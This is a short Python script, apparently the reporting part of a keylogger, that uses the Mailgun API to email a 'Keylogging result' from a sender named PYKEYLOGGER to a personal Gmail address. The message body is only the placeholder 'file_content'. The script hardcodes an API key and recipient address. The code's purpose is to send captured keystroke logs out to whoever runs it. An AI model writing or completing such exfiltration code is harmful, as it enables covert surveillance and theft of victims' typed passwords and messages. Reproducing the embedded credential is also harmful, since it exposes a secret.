import requests

def send_simple_message():
    return requests.post(
        "https://api.mailgun.net/v3/mg.ladmail.com/messages",
        auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
        data={"from": "PYKEYLOGGER <postmaster@mg.ladmail.com>",
              "to": "lad <hth225@gmail.com>",
              "subject": "Hello lad, Here is Keylogging result",
              "text":  "file_content"})

send_simple_message()